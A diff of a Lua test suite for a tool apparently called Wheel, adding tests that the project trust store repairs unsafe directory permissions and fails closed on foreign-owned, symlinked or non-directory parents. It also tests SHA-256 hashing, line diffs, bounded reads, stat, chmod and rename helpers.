+  local tmp_dir = "/tmp/bitty/test_wheel_store_parent_repair"
+  local state_dir = tmp_dir .. "/state/wheel"
+  local trust_file = state_dir .. "/trusted_projects.json"
+  local proj_a = tmp_dir .. "/a"
+  local proj_b = tmp_dir .. "/b"
+  local proj_c = tmp_dir .. "/c"
+  os.execute("rm -rf " .. tmp_dir
+    .. " && mkdir -p " .. proj_a .. "/.wheel " .. proj_b .. "/.wheel "
+    .. proj_c .. "/.wheel " .. state_dir)
+  os.execute("chmod 700 " .. state_dir)
+
+  local function write_entry(dir, value)
+    local handle = io.open(dir .. "/.wheel/init.lua", "w")
+    handle:write('return { verification = { test_command = "' .. value .. '" } }\n')
+    handle:close()
+  end
+  write_entry(proj_a, "a")
+  write_entry(proj_b, "b")
+  write_entry(proj_c, "c")
+
+  local a_status = WheelConfig.trust_status(proj_a, trust_file)
+  assert(a_status.ok == true)
+  assert(WheelConfig.trust(proj_a, a_status.hash, trust_file) == true)
+
+  -- A 0755 parent is user-owned and not group/world-writable, but confirmation
+  -- still repairs it to 0700 and preserves the existing record.
+  os.execute("chmod 755 " .. state_dir)
+  local b_status = WheelConfig.trust_status(proj_b, trust_file)
+  assert(b_status.ok == true)
+  local b_ok, b_err = WheelConfig.trust(proj_b, b_status.hash, trust_file)
+  assert(b_ok == true, tostring(b_err and b_err.message))
+  local after_b = WheelConfig.read_trust_store(trust_file)
+  assert(after_b.projects[a_status.root] ~= nil, "the existing project must be preserved")
+  assert(after_b.projects[b_status.root] ~= nil, "the new project must be added")
+  local b_mode = WheelHost.fs.stat(state_dir)
+  assert(b_mode.mode == 448,
+    "confirmation must repair the parent to mode 0700, got " .. tostring(b_mode.mode))
+
+  -- A group/world-writable parent with an existing store exercises the
+  -- permission-warning repair path: chmod 0700, re-read, preserve, add.
+  os.execute("chmod 777 " .. state_dir)
+  local c_status = WheelConfig.trust_status(proj_c, trust_file)
+  assert(c_status.ok == true)
+  assert(c_status.store_warning ~= nil
+    and c_status.store_warning.code == "E_TRUST_STORE_PERMISSIONS",
+    "a 0777 parent must surface the permission warning")
+  local c_ok, c_err = WheelConfig.trust(proj_c, c_status.hash, trust_file)
+  assert(c_ok == true, tostring(c_err and c_err.message))
+  local after_c = WheelConfig.read_trust_store(trust_file)
+  assert(after_c.projects[a_status.root] ~= nil, "repair must preserve the first record")
+  assert(after_c.projects[b_status.root] ~= nil, "repair must preserve the second record")
+  assert(after_c.projects[c_status.root] ~= nil, "repair must add the third record")
+  local c_mode = WheelHost.fs.stat(state_dir)
+  assert(c_mode.mode == 448, "the repaired parent must be mode 0700")
+
+  -- A foreign-owned parent fails closed and must not write.
+  local before_raw = WheelHost.fs.read_file(trust_file)
+  local backend = WheelHost.backend
+  local original_stat = backend.stat
+  backend.stat = function(path)
+    local info = original_stat(path)
+    if path == state_dir and type(info.uid) == "number" then
+      info.uid = info.uid + 1
+    end
+    return info
+  end
+  local d_status = WheelConfig.trust_status(proj_a, trust_file)
+  local foreign_ok, foreign_err = WheelConfig.trust(proj_a, d_status.hash, trust_file)
+  backend.stat = original_stat
+  assert(foreign_ok == false and foreign_err ~= nil
+    and foreign_err.code == "E_TRUST_STORE_FOREIGN_OWNED",
+    "a foreign-owned parent must fail closed")
+  assert(WheelHost.fs.read_file(trust_file) == before_raw,
+    "a failed foreign-owner confirmation must not rewrite the store")
+
+  -- A non-directory parent fails closed.
+  local not_dir = tmp_dir .. "/not-a-directory"
+  local nd = io.open(not_dir, "w")
+  nd:write("x")
+  nd:close()
+  local nd_status = WheelConfig.trust_status(proj_a, not_dir .. "/trusted_projects.json")
+  local nd_ok, nd_err = WheelConfig.trust(proj_a, nd_status.hash,
+    not_dir .. "/trusted_projects.json")
+  assert(nd_ok == false and nd_err ~= nil
+    and nd_err.code == "E_TRUST_STORE_NOT_REGULAR",
+    "a non-directory parent must fail closed")
+
+  -- A symlinked parent fails closed.
+  local link_parent = tmp_dir .. "/state-link"
+  os.execute("ln -s " .. state_dir .. " " .. link_parent)
+  local link_status = WheelConfig.trust_status(proj_a, link_parent .. "/trusted_projects.json")
+  local link_ok, link_err = WheelConfig.trust(proj_a, link_status.hash,
+    link_parent .. "/trusted_projects.json")
+  assert(link_ok == false and link_err ~= nil
+    and link_err.code == "E_TRUST_STORE_SYMLINK",
+    "a symlinked parent must fail closed")
+
+  os.execute("rm -rf " .. tmp_dir)
+end)
+
+run_test("WheelConfig: hash helper uses native SHA-256 and matches the pure vector", function()
+  local content = "return { verification = { test_command = \"hash\" } }\n"
+  local native = WheelConfig.compute_content_hash(content)
+  assert(#native == 64 and native:match("^%x+$") ~= nil,
+    "the content hash must be full 64-hex")
+  assert(native == WheelConfig.compute_hash(content),
+    "native and pure SHA-256 must agree for the same bytes")
+end)
+
+run_test("WheelConfig: pure line diff never reports no-change for changed bytes", function()
+  local changed = WheelConfig.compute_diff(
+    "return { a = 1 }\n", "return { a = 2 }\n")
+  assert(changed ~= "(no changes)", "changed bytes must not render as no changes")
+  assert(changed:find("-return { a = 1 }", 1, true) ~= nil,
+    "diff must show the removed line")
+  assert(changed:find("+return { a = 2 }", 1, true) ~= nil,
+    "diff must show the added line")
+
+  local added = WheelConfig.compute_diff("alpha\n", "alpha\nbeta\n")
+  assert(added:find("+beta", 1, true) ~= nil, "diff must show an added line")
+  assert(added ~= "(no changes)")
+
+  local removed = WheelConfig.compute_diff("alpha\nbeta\n", "alpha\n")
+  assert(removed:find("-beta", 1, true) ~= nil, "diff must show a removed line")
+
+  local newline_only = WheelConfig.compute_diff("alpha", "alpha\n")
+  assert(newline_only ~= "(no changes)",
+    "a trailing-newline change must not render as no changes")
+
+  assert(WheelConfig.compute_diff("same\n", "same\n") == "(no changes)",
+    "identical bytes must render as no changes")
+
+  -- Simulate a host where an external diff is absent or failing. The pure
+  -- implementation must not consult it and must still show the change.
+  local original_run_program = WheelHost.proc.run_program
+  WheelHost.proc.run_program = function(program)
+    if program == "diff" then
+      return { ok = false, code = 1, stdout = "", stderr = "diff missing" }
+    end
+    return original_run_program(program)
+  end
+  local no_tool = WheelConfig.compute_diff(
+    "return { a = 1 }\n", "return { a = 2 }\n")
+  WheelHost.proc.run_program = original_run_program
+  assert(no_tool:find("+return { a = 2 }", 1, true) ~= nil,
+    "a missing diff tool must not suppress the changed lines")
+  assert(no_tool ~= "(no changes)")
 end)
 
 run_test("WheelAgent: headless panel working container invariants and telemetry", function()
@@ -2983,14 +3695,26 @@ run_test("README: command table matches M.command_catalog names and schemas", fu
       "README must document invocation " .. invocation)
 
     local args_cell = cells[3]:lower()
-    assert(args_cell:find("no arguments", 1, true) ~= nil,
-      "README must document the empty arguments schema for " .. def.id)
-    assert(args_cell:find("no properties", 1, true) ~= nil,
-      "README must document the closed object with no properties for " .. def.id)
+    if def.id == "trust" then
+      assert(args_cell:find("optional object", 1, true) ~= nil,
+        "README must document the optional trust argument object")
+      assert(args_cell:find("action", 1, true) ~= nil
+        and args_cell:find("hash", 1, true) ~= nil
+        and args_cell:find("path", 1, true) ~= nil,
+        "README must document the trust action/hash/path fields")
+      assert(def.args_schema.type == "object" and def.args_schema.additionalProperties == false
+        and type(def.args_schema.properties) == "table",
+        "trust must keep a closed schema with optional action/hash/path fields")
+    else
+      assert(args_cell:find("no arguments", 1, true) ~= nil,
+        "README must document the empty arguments schema for " .. def.id)
+      assert(args_cell:find("no properties", 1, true) ~= nil,
+        "README must document the closed object with no properties for " .. def.id)
 
-    assert(def.args_schema.type == "object" and def.args_schema.additionalProperties == false
-      and def.args_schema.properties == nil,
-      "command " .. def.id .. " must keep its closed, property-free arguments schema")
+      assert(def.args_schema.type == "object" and def.args_schema.additionalProperties == false
+        and def.args_schema.properties == nil,
+        "command " .. def.id .. " must keep its closed, property-free arguments schema")
+    end
 
     local result_cell = cells[4]
     local property_count = 0
@@ -5498,6 +6222,51 @@ run_test("WheelHost: fs primitives (mkdir_p, write_file, read_file, list_dir)", 
   end
   assert(found, "listing must contain the written file")
 
+  -- Bounded reads stop at the requested bound instead of reading whole files.
+  local bounded = WheelHost.fs.read_file_bounded(target, 4)
+  assert(bounded == "host", "bounded read must return at most the bound")
+  local bounded_over = WheelHost.fs.read_file_bounded(target, #"host seam payload\n" + 1)
+  assert(bounded_over == "host seam payload\n", "bounded read must return the full file under the bound")
+  local bounded_empty = WheelHost.fs.read_file_bounded(target, 0)
+  assert(bounded_empty == "", "a zero bound must return an empty string")
+  local directory_read, directory_read_err = WheelHost.fs.read_file_bounded("/tmp", 10)
+  assert(directory_read == nil and type(directory_read_err) == "string",
+    "a read failure must return nil and an error, never an empty string")
+  if WheelHost.fs.exists("/dev/full") then
+    local full_ok, full_err = WheelHost.fs.write_file("/dev/full", "write-must-fail")
+    assert(full_ok == false and type(full_err) == "string",
+      "a short/failed write must fail closed instead of reporting success")
+  end
+
+  -- stat reports type and link status without following the final link.
+  local stat = WheelHost.fs.stat(target)
+  assert(stat.exists == true and stat.regular == true and stat.symlink == false,
+    "stat must identify a regular file")
+  assert(stat.directory == false, "stat must not call a regular file a directory")
+  assert(type(stat.uid) == "number" and type(stat.mode) == "number",
+    "stat must report owner and mode when the platform provides stat")
+  local missing_stat = WheelHost.fs.stat(root .. "/nested/deep/absent.txt")
+  assert(missing_stat.exists == false, "stat must report a missing path without error")
+  local link_path = root .. "/nested/deep/sample.link"
+  os.execute("ln -s " .. target .. " " .. link_path)
+  local link_stat = WheelHost.fs.stat(link_path)
+  assert(link_stat.exists == true and link_stat.symlink == true,
+    "stat must identify a symbolic link")
+  assert(link_stat.regular == true, "stat must still describe the symlink target type")
+
+  -- chmod and same-directory rename are real filesystem operations.
+  local chmod_ok = WheelHost.fs.chmod(target, "600")
+  assert(chmod_ok == true, "chmod must report success")
+  local after_chmod = WheelHost.fs.stat(target)
+  assert(after_chmod.mode == 384, "chmod 600 must produce mode 0600 (384 decimal)")
+  local renamed = root .. "/nested/deep/renamed.txt"
+  local rename_ok = WheelHost.fs.rename(target, renamed)
+  assert(rename_ok == true, "rename must report success")
+  assert(WheelHost.fs.read_file(renamed) == "host seam payload\n",
+    "rename must preserve content")
+  assert(WheelHost.fs.stat(target).exists == false, "rename must remove the old path")
+  os.execute("rm -f " .. link_path)
+
   os.execute("rm -rf " .. root)
 end)
 
@@ -5559,9 +6328,13 @@ run_test("WheelHost: unavailable primitives return typed denials", function()
     { label = "fs.mkdir_p", capability = "fs.write", call = function() return WheelHost.fs.mkdir_p("/tmp/x") end },
     { label = "fs.list_dir", capability = "fs.read", call = function() return WheelHost.fs.list_dir("/tmp") end },
     { label = "fs.read_file", capability = "fs.read", call = function() return WheelHost.fs.read_file("/tmp/x") end },
+    { label = "fs.read_file_bounded", capability = "fs.read", call = function() return WheelHost.fs.read_file_bounded("/tmp/x", 1) end },
     { label = "fs.write_file", capability = "fs.write", call = function() return WheelHost.fs.write_file("/tmp/x", "x") end },
+    { label = "fs.chmod", capability = "fs.write", call = function() return WheelHost.fs.chmod("/tmp/x", "600") end },
+    { label = "fs.rename", capability = "fs.write", call = function() return WheelHost.fs.rename("/tmp/x", "/tmp/y") end },
     { label = "fs.remove_file", capability = "fs.write", call = function() return WheelHost.fs.remove_file("/tmp/x") end },
     { label = "fs.exists", capability = "fs.read", call = function() return WheelHost.fs.exists("/tmp/x") end },
+    { label = "fs.stat", capability = "fs.read", call = function() return WheelHost.fs.stat("/tmp/x") end },
     { label = "proc.run_command", capability = "process.spawn", call = function() return WheelHost.proc.run_command("true") end },
     { label = "proc.run_program", capability = "process.spawn", call = function() return WheelHost.proc.run_program("true") end },
     { label = "proc.shell_quote", capability = "process.spawn", call = function() return WheelHost.proc.shell_quote("x") end },
